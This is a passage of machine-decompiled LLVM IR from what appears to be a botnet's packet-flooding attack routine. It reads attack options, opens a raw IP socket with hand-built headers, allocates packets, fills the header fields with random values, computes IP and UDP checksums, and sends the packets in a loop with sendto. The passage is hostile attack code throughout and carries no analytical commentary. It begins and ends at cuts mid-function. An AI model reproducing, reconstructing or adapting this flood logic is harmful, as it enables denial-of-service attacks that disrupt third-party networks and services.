  %v7_af04 = call i32 @attack_get_opt_int(i32 %v0_aefc, i32* %v6_af04, i32 3, i32 65535, i32 %v6_aee0)
  %v0_af08 = load i32, i32* @r4, align 4
  store i32 %v0_af08, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_af18 = load i32, i32* @r5, align 4
  store i32 %v0_af18, i32* %r0.global-to-local, align 4
  %v5_af1c = inttoptr i32 %v0_af08 to i32*
  %v6_af1c = call i32 @attack_get_opt_int(i32 %v0_af18, i32* %v5_af1c, i32 4, i32 64, i32 %v7_af04)
  %v1_af24 = urem i32 %v6_af1c, 256
  store i32 %v1_af24, i32* %ip.global-to-local, align 4
  %v0_af28 = load i32, i32* @r4, align 4
  store i32 %v0_af28, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_af30 = load i32, i32* @r8, align 4
  store i32 %v0_af30, i32* %r3.global-to-local, align 4
  %v0_af34 = load i32, i32* @r5, align 4
  store i32 %v0_af34, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_af1c, 16777216
  %v5_af3c = sdiv i32 %sext, 16777216
  %v6_af3c = inttoptr i32 %v0_af28 to i32*
  %v7_af3c = call i32 @attack_get_opt_int(i32 %v0_af34, i32* %v6_af3c, i32 5, i32 %v0_af30, i32 %v5_af3c)
  %v1_af48 = urem i32 %v7_af3c, 256
  store i32 %v1_af48, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_af54 = load i32, i32* @r4, align 4
  store i32 %v0_af54, i32* %r1.global-to-local, align 4
  %v0_af58 = load i32, i32* @r5, align 4
  store i32 %v0_af58, i32* %r0.global-to-local, align 4
  %v5_af60 = inttoptr i32 %v0_af54 to i32*
  %v6_af60 = call i32 @attack_get_opt_int(i32 %v0_af58, i32* %v5_af60, i32 6, i32 65535, i32 %v1_af48)
  %v0_af6c = load i32, i32* @r4, align 4
  store i32 %v0_af6c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_af78 = load i32, i32* @r5, align 4
  store i32 %v0_af78, i32* %r0.global-to-local, align 4
  %v5_af7c = inttoptr i32 %v0_af6c to i32*
  %v6_af7c = call i32 @attack_get_opt_int(i32 %v0_af78, i32* %v5_af7c, i32 7, i32 65535, i32 %v6_af60)
  %v0_af80 = load i32, i32* @r4, align 4
  store i32 %v0_af80, i32* %r1.global-to-local, align 4
  %v0_af88 = load i32, i32* @r8, align 4
  store i32 %v0_af88, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_af90 = load i32, i32* @r5, align 4
  store i32 %v0_af90, i32* %r0.global-to-local, align 4
  %v5_af94 = inttoptr i32 %v0_af80 to i32*
  %v6_af94 = call i32 @attack_get_opt_int(i32 %v0_af90, i32* %v5_af94, i32 %v0_af88, i32 512, i32 %v6_af7c)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_afa0 = load i32, i32* @r4, align 4
  store i32 %v0_afa0, i32* %r1.global-to-local, align 4
  store i32 %v6_af94, i32* @sl, align 4
  %v0_afa8 = load i32, i32* @r5, align 4
  store i32 %v0_afa8, i32* %r0.global-to-local, align 4
  %v5_afac = inttoptr i32 %v0_afa0 to i32*
  %v6_afac = call i32 @attack_get_opt_int(i32 %v0_afa8, i32* %v5_afac, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_afb8 = load i32, i32* @global_var_23a4c.55, align 4
  store i32 %v2_afb8, i32* %r3.global-to-local, align 4
  %v1_afbc = urem i32 %v6_afac, 256
  store i32 %v1_afbc, i32* %ip.global-to-local, align 4
  %v0_afc0 = load i32, i32* @r4, align 4
  store i32 %v0_afc0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_afc8 = load i32, i32* @r5, align 4
  store i32 %v0_afc8, i32* %r0.global-to-local, align 4
  %v5_afd0 = inttoptr i32 %v0_afc0 to i32*
  %v6_afd0 = call i32 @attack_get_opt_int(i32 %v0_afc8, i32* %v5_afd0, i32 24, i32 %v2_afb8, i32 %v1_afbc)
  store i32 %v6_afd0, i32* @sb, align 4
  %v0_afd8 = load i32, i32* @r8, align 4
  store i32 %v0_afd8, i32* %r0.global-to-local, align 4
  %v1_afdc = inttoptr i32 %v0_afd8 to i32*
  %v2_afdc = call i32 @__GI_time(i32* %v1_afdc)
  %v1_afe0 = load i32, i32* @r6, align 4
  %v2_afe0 = add i32 %v1_afe0, %v2_afdc
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_aff4 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_aff4, i32* %r0.global-to-local, align 4
  %v7_aff8 = icmp eq i32 %v3_aff4, -1
  store i32 %v3_aff4, i32* @fp, align 4
  br i1 %v7_aff8, label %dec_label_pc_b44c, label %dec_label_pc_b004

dec_label_pc_b004:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b00c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b00c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b014 = load i32, i32* @r8, align 4
  store i32 %v0_b014, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b020 = call i32 @__GI_setsockopt(i32 %v3_aff4, i32 %v0_b014, i32 3, i32 %v6_b00c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b020, i32* %r0.global-to-local, align 4
  %v7_b024 = icmp eq i32 %v5_b020, -1
  br i1 %v7_b024, label %dec_label_pc_b458, label %dec_label_pc_b02c

dec_label_pc_b02c:                                ; preds = %dec_label_pc_b004
  %v0_b02c = load i32, i32* @sl, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_b038 = urem i32 %v0_b02c, 65536
  %v3_b03c = icmp ugt i32 %v3_b038, 1459
  br i1 %v3_b03c, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_b02c
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_b02c, %bb
  %storemerge = phi i32 [ 1460, %bb ], [ %v3_b038, %dec_label_pc_b02c ]
  %v0_b048 = phi i32 [ 1460, %bb ], [ %v3_b038, %dec_label_pc_b02c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v6_af60, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v3_b05c = mul i32 %v6_af7c, 65536
  store i32 %v3_b05c, i32* %r2.global-to-local, align 4
  %v3_b064 = urem i32 %v7_af04, 65536
  %v3_b068 = urem i32 %v6_af60, 65536
  store i32 %v3_b068, i32* %ip.global-to-local, align 4
  %v3_b06c = urem i32 %v6_af7c, 65536
  store i32 %v3_b06c, i32* %r0.global-to-local, align 4
  %v2_b070 = icmp eq i32 %arg2, 0
  %v0_b078 = load i32, i32* @r8, align 4
  store i32 %v0_b078, i32* %stack_var_-44, align 4
  br i1 %v2_b070, label %.dec_label_pc_b1a4.preheader_crit_edge, label %dec_label_pc_b08c

.dec_label_pc_b1a4.preheader_crit_edge:           ; preds = %bb41
  %.pre = add nuw nsw i32 %v0_b048, 8
  %.pre10 = add nuw nsw i32 %v0_b048, 28
  br label %dec_label_pc_b1a4.preheader

dec_label_pc_b08c:                                ; preds = %bb41
  %v1_b094 = add nuw nsw i32 %v0_b048, 28
  %v1_b098 = add nuw nsw i32 %v0_b048, 8
  %tmp42 = mul nuw nsw i32 %v3_b068, 256
  %v3_b0a8 = and i32 %tmp42, 65280
  %v3_b0b0 = mul i32 %v1_b094, 65536
  store i32 %v3_b0b0, i32* @lr, align 4
  %tmp43 = udiv i32 %v6_af60, 256
  %v4_b0b8 = urem i32 %tmp43, 256
  %v5_b0b8 = or i32 %v3_b0a8, %v4_b0b8
  store i32 %v5_b0b8, i32* @sl, align 4
  store i32 %v3_b05c, i32* %r1.global-to-local, align 4
  %tmp44 = mul i32 %v6_af7c, 256
  %v3_b0d0 = and i32 %tmp44, 65280
  %v2_b0d4 = icmp eq i32 %v1_af48, 0
  %tmp45 = mul nuw nsw i32 %v1_b094, 256
  %v3_b0d8 = and i32 %tmp45, 65280
  store i32 %v3_b0d8, i32* %r3.global-to-local, align 4
  %tmp46 = mul i32 %v7_af04, 256
  %v3_b0dc = and i32 %tmp46, 65280
  store i32 %v3_b0dc, i32* %r2.global-to-local, align 4
  %tmp47 = mul nuw nsw i32 %v1_b098, 256
  %v3_b0e0 = and i32 %tmp47, 65280
  store i32 %v3_b0e0, i32* %ip.global-to-local, align 4
  %tmp48 = udiv i32 %v6_af7c, 256
  %v4_b0e4 = urem i32 %tmp48, 256
  %v5_b0e4 = or i32 %v4_b0e4, %v3_b0d0
  store i32 %v5_b0e4, i32* %r0.global-to-local, align 4
  %tmp49 = udiv i32 %v7_af04, 256
  %v4_b0e8 = urem i32 %tmp49, 256
  %v5_b0e8 = or i32 %v4_b0e8, %v3_b0dc
  store i32 %v5_b0e8, i32* @r8, align 4
  %tmp50 = udiv i32 %v1_b094, 256
  %v4_b0ec = urem i32 %tmp50, 256
  %v5_b0ec = or i32 %v4_b0ec, %v3_b0d8
  store i32 %v5_b0ec, i32* @r6, align 4
  %tmp51 = udiv i32 %v1_b098, 256
  %v4_b0f0 = urem i32 %tmp51, 256
  %v5_b0f0 = or i32 %v4_b0f0, %v3_b0e0
  store i32 %v5_b0f0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %sext11 = mul nuw i32 %v5_b0e4, 65536
  %v4_b178 = sdiv i32 %sext11, 65536
  %v1_b15c = trunc i32 %v5_af3c to i8
  br i1 %v2_b0d4, label %dec_label_pc_b100, label %dec_label_pc_b38c

dec_label_pc_b100:                                ; preds = %dec_label_pc_b08c, %dec_label_pc_b100
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_b10c = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_b10c, i32* %r0.global-to-local, align 4
  store i32 %v2_aec8, i32* %r2.global-to-local, align 4
  %v2_b118 = load i32, i32* @r4, align 4
  %v5_b118 = mul i32 %v2_b118, 4
  %v6_b118 = add i32 %v5_b118, %v2_aec8
  %v7_b118 = inttoptr i32 %v6_b118 to i32*
  store i32 %v2_b10c, i32* %v7_b118, align 4
  %v3_b11c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b11c, i32* %r1.global-to-local, align 4
  %v0_b120 = load i32, i32* %r2.global-to-local, align 4
  %v4_b120 = mul i32 %v3_b11c, 4
  %v5_b120 = add i32 %v0_b120, %v4_b120
  %v6_b120 = inttoptr i32 %v5_b120 to i32*
  %v7_b120 = load i32, i32* %v6_b120, align 4
  store i32 %v7_b120, i32* %r3.global-to-local, align 4
  %v1_b124 = inttoptr i32 %v7_b120 to i8*
  %v2_b124 = load i8, i8* %v1_b124, align 1
  %tmp = urem i8 %v2_b124, 16
  %v1_b128 = zext i8 %tmp to i32
  %v1_b12c = or i32 %v1_b128, 64
  store i32 %v1_b12c, i32* %r2.global-to-local, align 4
  %v1_b130 = trunc i32 %v1_b12c to i8
  store i8 %v1_b130, i8* %v1_b124, align 1
  %v0_b134 = load i32, i32* %r3.global-to-local, align 4
  %v1_b134 = inttoptr i32 %v0_b134 to i8*
  %v2_b134 = load i8, i8* %v1_b134, align 1
  %v1_b138 = and i8 %v2_b134, -16
  %v1_b13c = or i8 %v1_b138, 5
  store i32 17, i32* %ip.global-to-local, align 4
  store i8 %v1_b13c, i8* %v1_b134, align 1
  %v0_b148 = load i32, i32* %ip.global-to-local, align 4
  %v1_b148 = trunc i32 %v0_b148 to i8
  %v2_b148 = load i32, i32* %r3.global-to-local, align 4
  %v3_b148 = add i32 %v2_b148, 9
  %v4_b148 = inttoptr i32 %v3_b148 to i8*
  store i8 %v1_b148, i8* %v4_b148, align 1
  %v2_b150 = load i32, i32* %r3.global-to-local, align 4
  %v3_b150 = add i32 %v2_b150, 1
  %v4_b150 = inttoptr i32 %v3_b150 to i8*
  store i8 %v5_af00, i8* %v4_b150, align 1
  %v0_b158 = load i32, i32* %r1.global-to-local, align 4
  %v3_b158 = mul i32 %v0_b158, 32
  store i32 %v3_b158, i32* %r0.global-to-local, align 4
  %v2_b15c = load i32, i32* %r3.global-to-local, align 4
  %v3_b15c = add i32 %v2_b15c, 8
  %v4_b15c = inttoptr i32 %v3_b15c to i8*
  store i8 %v1_b15c, i8* %v4_b15c, align 1
  %v0_b160 = load i32, i32* @sb, align 4
  %v1_b160 = load i32, i32* %r3.global-to-local, align 4
  %v2_b160 = add i32 %v1_b160, 12
  %v3_b160 = inttoptr i32 %v2_b160 to i32*
  store i32 %v0_b160, i32* %v3_b160, align 4
  %v0_b164 = load i32, i32* %r0.global-to-local, align 4
  %v1_b164 = load i32, i32* %r1.global-to-local, align 4
  %tmp53 = mul i32 %v1_b164, -8
  %v5_b164 = add i32 %v0_b164, %tmp53
  %v1_b168 = load i32, i32* @r7, align 4
  %v2_b168 = add i32 %v5_b164, %v1_b168
  store i32 %v2_b168, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_b170 = add i32 %v1_b164, 1
  store i32 %v1_b170, i32* @r4, align 4
  %v1_b174 = add i32 %v2_b168, 16
  %v2_b174 = inttoptr i32 %v1_b174 to i32*
  %v3_b174 = load i32, i32* %v2_b174, align 4
  store i32 %v3_b174, i32* %r2.global-to-local, align 4
  store i32 %v4_b178, i32* %r0.global-to-local, align 4
  %v0_b17c = load i32, i32* %r3.global-to-local, align 4
  %v1_b17c = add i32 %v0_b17c, 20
  store i32 %v1_b17c, i32* %r1.global-to-local, align 4
  %v0_b184 = load i32, i32* @r6, align 4
  %v1_b184 = trunc i32 %v0_b184 to i16
  %v3_b184 = add i32 %v0_b17c, 2
  %v4_b184 = inttoptr i32 %v3_b184 to i16*
  store i16 %v1_b184, i16* %v4_b184, align 2
  %v0_b188 = load i32, i32* @r8, align 4
  %v1_b188 = trunc i32 %v0_b188 to i16
  %v2_b188 = load i32, i32* %r3.global-to-local, align 4
  %v3_b188 = add i32 %v2_b188, 4
  %v4_b188 = inttoptr i32 %v3_b188 to i16*
  store i16 %v1_b188, i16* %v4_b188, align 2
  %v0_b18c = load i32, i32* %r2.global-to-local, align 4
  %v1_b18c = load i32, i32* %r3.global-to-local, align 4
  %v2_b18c = add i32 %v1_b18c, 16
  %v3_b18c = inttoptr i32 %v2_b18c to i32*
  store i32 %v0_b18c, i32* %v3_b18c, align 4
  %v0_b190 = load i32, i32* @sl, align 4
  %v1_b190 = trunc i32 %v0_b190 to i16
  %v2_b190 = load i32, i32* %r3.global-to-local, align 4
  %v3_b190 = add i32 %v2_b190, 20
  %v4_b190 = inttoptr i32 %v3_b190 to i16*
  store i16 %v1_b190, i16* %v4_b190, align 2
  %v0_b194 = load i32, i32* @r5, align 4
  %v1_b194 = trunc i32 %v0_b194 to i16
  %v2_b194 = load i32, i32* %r1.global-to-local, align 4
  %v3_b194 = add i32 %v2_b194, 4
  %v4_b194 = inttoptr i32 %v3_b194 to i16*
  store i16 %v1_b194, i16* %v4_b194, align 2
  %v0_b198 = load i32, i32* %r0.global-to-local, align 4
  %v1_b198 = trunc i32 %v0_b198 to i16
  %v2_b198 = load i32, i32* %r1.global-to-local, align 4
  %v3_b198 = add i32 %v2_b198, 2
  %v4_b198 = inttoptr i32 %v3_b198 to i16*
  store i16 %v1_b198, i16* %v4_b198, align 2
  %v0_b19c = load i32, i32* @r4, align 4
  store i32 %v0_b19c, i32* %stack_var_-44, align 4
  %v5_b1a0 = icmp slt i32 %v1_b170, %arg2
  br i1 %v5_b1a0, label %dec_label_pc_b100, label %dec_label_pc_b1a4.preheader

dec_label_pc_b1a4.preheader:                      ; preds = %dec_label_pc_b38c, %dec_label_pc_b100, %.dec_label_pc_b1a4.preheader_crit_edge
  %v1_b1c4.pre-phi = phi i32 [ %.pre10, %.dec_label_pc_b1a4.preheader_crit_edge ], [ %v1_b094, %dec_label_pc_b100 ], [ %v1_b094, %dec_label_pc_b38c ]
  %v1_b1c0.pre-phi = phi i32 [ %.pre, %.dec_label_pc_b1a4.preheader_crit_edge ], [ %v1_b098, %dec_label_pc_b100 ], [ %v1_b098, %dec_label_pc_b38c ]
  %v3_b324 = icmp eq i32 %v3_b064, 65535
  %v2_b360 = icmp eq i32 %v1_afbc, 0
  br label %dec_label_pc_b1a4

dec_label_pc_b1a4:                                ; preds = %dec_label_pc_b1a4.preheader, %dec_label_pc_b438
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b070, label %dec_label_pc_b438, label %dec_label_pc_b1b8

dec_label_pc_b1b8:                                ; preds = %dec_label_pc_b1a4
  store i32 %v0_b048, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_b1c0.pre-phi, i32* @sl, align 4
  store i32 %v1_b1c4.pre-phi, i32* @r8, align 4
  br label %dec_label_pc_b294

dec_label_pc_b1cc:                                ; preds = %dec_label_pc_b294
  %v0_b1cc = load i32, i32* @sb, align 4
  %v7_b1cc = icmp eq i32 %v0_b1cc, -1
  br i1 %v7_b1cc, label %dec_label_pc_b314, label %dec_label_pc_b1d4

dec_label_pc_b1d4:                                ; preds = %dec_label_pc_b2b8, %dec_label_pc_b1cc
  store i32 %v3_b064, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  br i1 %v3_b324, label %dec_label_pc_b330, label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b314.dec_label_pc_b1e8_crit_edge, %dec_label_pc_b1d4
  %v1_b1ec = phi i32 [ %v1_b1ec.pre, %dec_label_pc_b314.dec_label_pc_b1e8_crit_edge ], [ 65535, %dec_label_pc_b1d4 ]
  store i32 %v3_b068, i32* %r0.global-to-local, align 4
  %v9_b1ec = icmp eq i32 %v3_b068, %v1_b1ec
  br i1 %v9_b1ec, label %dec_label_pc_b344, label %dec_label_pc_b1f4

dec_label_pc_b1f4:                                ; preds = %dec_label_pc_b330, %dec_label_pc_b1e8
  %v1_b1f8 = phi i32 [ %v1_b33c, %dec_label_pc_b330 ], [ %v1_b1ec, %dec_label_pc_b1e8 ]
  store i32 %v3_b06c, i32* %r1.global-to-local, align 4
  %v9_b1f8 = icmp eq i32 %v3_b06c, %v1_b1f8
  br i1 %v9_b1f8, label %dec_label_pc_b358, label %dec_label_pc_b200

dec_label_pc_b200:                                ; preds = %dec_label_pc_b344, %dec_label_pc_b1f4
  store i32 %v1_afbc, i32* %r2.global-to-local, align 4
  br i1 %v2_b360, label %dec_label_pc_b20c, label %dec_label_pc_b36c

dec_label_pc_b20c:                                ; preds = %dec_label_pc_b200, %dec_label_pc_b358, %dec_label_pc_b36c
  %v2_b210 = load i32, i32* @r5, align 4
  %v3_b210 = add i32 %v2_b210, 10
  %v4_b210 = inttoptr i32 %v3_b210 to i16*
  store i16 0, i16* %v4_b210, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b218 = load i32, i32* @r5, align 4
  store i32 %v0_b218, i32* @r0, align 4
  %v2_b21c = call i32 @checksum_generic(i32 %v0_b218, i32 20)
  %v3_b21c = trunc i32 %v2_b21c to i16
  store i32 %v2_b21c, i32* %r0.global-to-local, align 4
  %v3_b220 = load i32, i32* @r5, align 4
  %v4_b220 = add i32 %v3_b220, 10
  %v5_b220 = inttoptr i32 %v4_b220 to i16*
  store i16 %v3_b21c, i16* %v5_b220, align 2
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_b228 = load i32, i32* @r6, align 4
  %v3_b228 = add i32 %v2_b228, 6
  %v4_b228 = inttoptr i32 %v3_b228 to i16*
  store i16 0, i16* %v4_b228, align 2
  %v0_b22c = load i32, i32* @r6, align 4
  %v1_b22c = add i32 %v0_b22c, 4
  %v2_b22c = inttoptr i32 %v1_b22c to i16*
  %v3_b22c = load i16, i16* %v2_b22c, align 2
  %v4_b22c = zext i16 %v3_b22c to i32
  store i32 %v4_b22c, i32* %r2.global-to-local, align 4
  store i32 %v0_b22c, i32* @r1, align 4
  %v0_b234 = load i32, i32* @sl, align 4
  store i32 %v0_b234, i32* %r3.global-to-local, align 4
  %v0_b238 = load i32, i32* @r5, align 4
  store i32 %v0_b238, i32* %r0.global-to-local, align 4
  %v4_b23c = call i32 @checksum_tcpudp(i32 %v0_b238, i32 %v0_b22c, i32 %v4_b22c, i32 %v0_b234)
  %v5_b23c = trunc i32 %v4_b23c to i16
  store i32 %v4_b23c, i32* %r0.global-to-local, align 4
  %v3_b240 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b240, i32* %r3.global-to-local, align 4
  %v3_b244 = mul i32 %v3_b240, 32
  store i32 %v3_b244, i32* %lr.global-to-local, align 4
  %v3_b248 = load i32, i32* @r6, align 4
  %v4_b248 = add i32 %v3_b248, 6
  %v5_b248 = inttoptr i32 %v4_b248 to i16*
  store i16 %v5_b23c, i16* %v5_b248, align 2
  %v0_b24c = load i32, i32* %lr.global-to-local, align 4
  %v1_b24c = load i32, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v1_b24c, -8
  %v5_b24c = add i32 %v0_b24c, %tmp54
  store i32 %v5_b24c, i32* %lr.global-to-local, align 4
  %v0_b250 = load i32, i32* @r6, align 4
  %v1_b250 = add i32 %v0_b250, 2
  %v2_b250 = inttoptr i32 %v1_b250 to i16*
  %v3_b250 = load i16, i16* %v2_b250, align 2
  %v4_b250 = zext i16 %v3_b250 to i32
  store i32 %v4_b250, i32* @r6, align 4
  %v1_b254 = load i32, i32* @r7, align 4
  %v2_b254 = add i32 %v1_b254, %v5_b24c
  store i32 %v2_b254, i32* @lr, align 4
  %v3_b258 = add i32 %v2_b254, 2
  %v4_b258 = inttoptr i32 %v3_b258 to i16*
  store i16 %v3_b250, i16* %v4_b258, align 2
  %v0_b25c = load i32, i32* @r8, align 4
  store i32 %v0_b25c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b268 = load i32, i32* @r5, align 4
  store i32 %v0_b268, i32* %r1.global-to-local, align 4
  %v0_b26c = load i32, i32* @fp, align 4
  store i32 %v0_b26c, i32* %r0.global-to-local, align 4
  %v0_b270 = load i32, i32* @lr, align 4
  %v6_b278 = call i32 @__libc_sendto(i32 %v0_b26c, i32 %v0_b268, i32 %v0_b25c, i32 16384, i32 %v0_b270, i32 16)
  %v3_b27c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b27c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v1_b284 = add i32 %v3_b27c, 1
  store i32 %v1_b284, i32* %r0.global-to-local, align 4
  store i32 %v1_b284, i32* %stack_var_-44, align 4
  %v6_b290 = icmp slt i32 %v1_b284, %arg2
  br i1 %v6_b290, label %dec_label_pc_b294, label %dec_label_pc_b438

dec_label_pc_b294:                                ; preds = %dec_label_pc_b20c, %dec_label_pc_b1b8
  %v1_b2a8 = phi i32 [ %v1_b284, %dec_label_pc_b20c ], [ 0, %dec_label_pc_b1b8 ]
  %v5_b298 = mul i32 %v1_b2a8, 24
  %v1_b2a0 = load i32, i32* @r7, align 4
  %v2_b2a0 = add i32 %v1_b2a0, %v5_b298
  store i32 %v2_b2a0, i32* %r3.global-to-local, align 4
  %v1_b2a4 = add i32 %v2_b2a0, 20
  %v2_b2a4 = inttoptr i32 %v1_b2a4 to i8*
  %v3_b2a4 = load i8, i8* %v2_b2a4, align 1
  %v4_b2a4 = zext i8 %v3_b2a4 to i32
  store i32 %v4_b2a4, i32* %r2.global-to-local, align 4
  %v4_b2a8 = mul i32 %v1_b2a8, 4
  %v5_b2a8 = add i32 %v4_b2a8, %v2_aec8
  %v6_b2a8 = inttoptr i32 %v5_b2a8 to i32*
  %v7_b2a8 = load i32, i32* %v6_b2a8, align 4
  store i32 %v7_b2a8, i32* @r5, align 4
  %v1_b2b0 = add i32 %v7_b2a8, 20
  store i32 %v1_b2b0, i32* @r6, align 4
  %tmp55 = icmp ugt i8 %v3_b2a4, 31
  br i1 %tmp55, label %dec_label_pc_b1cc, label %dec_label_pc_b2b8

dec_label_pc_b2b8:                                ; preds = %dec_label_pc_b294
  %v1_b2b8 = add i32 %v2_b2a0, 16
  %v2_b2b8 = inttoptr i32 %v1_b2b8 to i32*
  %v3_b2b8 = load i32, i32* %v2_b2b8, align 4
  %v0_b2bc = call i32 @rand_next()
  store i32 %v0_b2bc, i32* %r0.global-to-local, align 4
  %v3_b2c0 = load i32, i32* %stack_var_-44, align 4
  %v5_b2c8 = mul i32 %v3_b2c0, 24
  %v1_b2cc = and i32 %v3_b2b8, 16711680
  store i32 %v1_b2cc, i32* %ip.global-to-local, align 4
  %v3_b2d0 = udiv i32 %v3_b2b8, 16777216
  %v4_b2d4 = udiv i32 %v1_b2cc, 256
  %v5_b2d4 = or i32 %v4_b2d4, %v3_b2d0
  store i32 %v5_b2d4, i32* %r2.global-to-local, align 4
  %v1_b2d8 = load i32, i32* @r7, align 4
  %v2_b2d8 = add i32 %v1_b2d8, %v5_b2c8
  store i32 %v2_b2d8, i32* %r1.global-to-local, align 4
  %v1_b2dc = and i32 %v3_b2b8, ptrtoint (i32* @global_var_ff00.28 to i32)
  store i32 %v1_b2dc, i32* %r3.global-to-local, align 4
  %v1_b2e0 = add i32 %v2_b2d8, 20
  %v2_b2e0 = inttoptr i32 %v1_b2e0 to i8*
  %v3_b2e0 = load i8, i8* %v2_b2e0, align 1
  %v4_b2e0 = zext i8 %v3_b2e0 to i32
  store i32 %v4_b2e0, i32* %ip.global-to-local, align 4
  %v4_b2e4 = mul i32 %v1_b2dc, 256
  %v4_b2e8 = mul i32 %v3_b2b8, 16777216
  %v5_b2e4 = or i32 %v4_b2e4, %v4_b2e8
  %v5_b2e8 = or i32 %v5_b2e4, %v5_b2d4
  %v7_b2ec = lshr i32 %v0_b2bc, %v4_b2e0
  %v8_b2ec = add i32 %v7_b2ec, %v5_b2e8
  store i32 %v8_b2ec, i32* %r2.global-to-local, align 4
  %v1_b2f0 = and i32 %v8_b2ec, 16711680
  store i32 %v1_b2f0, i32* %r0.global-to-local, align 4
  %v1_b2fc = and i32 %v8_b2ec, 65280
  store i32 %v1_b2fc, i32* %r1.global-to-local, align 4
  %v5_b304 = call i32 @llvm.bswap.i32(i32 %v8_b2ec)
  store i32 %v5_b304, i32* %r3.global-to-local, align 4
  %v0_b308 = load i32, i32* @sb, align 4
  %v3_b308 = icmp eq i32 %v0_b308, -1
  %v1_b30c = load i32, i32* @r5, align 4
  %v2_b30c = add i32 %v1_b30c, 16
  %v3_b30c = inttoptr i32 %v2_b30c to i32*
  store i32 %v5_b304, i32* %v3_b30c, align 4
  br i1 %v3_b308, label %dec_label_pc_b314, label %dec_label_pc_b1d4

dec_label_pc_b314:                                ; preds = %dec_label_pc_b2b8, %dec_label_pc_b1cc
  %v0_b314 = call i32 @rand_next()
  store i32 %v0_b314, i32* %r0.global-to-local, align 4
  store i32 %v3_b064, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  %v1_b328 = load i32, i32* @r5, align 4
  %v2_b328 = add i32 %v1_b328, 12
  %v3_b328 = inttoptr i32 %v2_b328 to i32*
  store i32 %v0_b314, i32* %v3_b328, align 4
  br i1 %v3_b324, label %dec_label_pc_b330, label %dec_label_pc_b314.dec_label_pc_b1e8_crit_edge

dec_label_pc_b314.dec_label_pc_b1e8_crit_edge:    ; preds = %dec_label_pc_b314
  %v1_b1ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b1e8

dec_label_pc_b330:                                ; preds = %dec_label_pc_b314, %dec_label_pc_b1d4
  %v0_b330 = call i32 @rand_next()
  %v1_b330 = trunc i32 %v0_b330 to i16
  %v3_b334 = load i32, i32* @r5, align 4
  %v4_b334 = add i32 %v3_b334, 4
  %v5_b334 = inttoptr i32 %v4_b334 to i16*
  store i16 %v1_b330, i16* %v5_b334, align 2
  store i32 %v3_b068, i32* %r0.global-to-local, align 4
  %v1_b33c = load i32, i32* @r4, align 4
  %v9_b33c = icmp eq i32 %v3_b068, %v1_b33c
  br i1 %v9_b33c, label %dec_label_pc_b344, label %dec_label_pc_b1f4

dec_label_pc_b344:                                ; preds = %dec_label_pc_b330, %dec_label_pc_b1e8
  %v0_b344 = call i32 @rand_next()
  %v1_b344 = trunc i32 %v0_b344 to i16
  store i32 %v0_b344, i32* %r0.global-to-local, align 4
  store i32 %v3_b06c, i32* %r1.global-to-local, align 4
  %v1_b34c = load i32, i32* @r4, align 4
  %v9_b34c = icmp eq i32 %v3_b06c, %v1_b34c
  %v3_b350 = load i32, i32* @r5, align 4
  %v4_b350 = add i32 %v3_b350, 20
  %v5_b350 = inttoptr i32 %v4_b350 to i16*
  store i16 %v1_b344, i16* %v5_b350, align 2
  br i1 %v9_b34c, label %dec_label_pc_b358, label %dec_label_pc_b200

dec_label_pc_b358:                                ; preds = %dec_label_pc_b344, %dec_label_pc_b1f4
  %v0_b358 = call i32 @rand_next()
  %v1_b358 = trunc i32 %v0_b358 to i16
  store i32 %v0_b358, i32* %r0.global-to-local, align 4
  store i32 %v1_afbc, i32* %r2.global-to-local, align 4
  %v3_b364 = load i32, i32* @r6, align 4
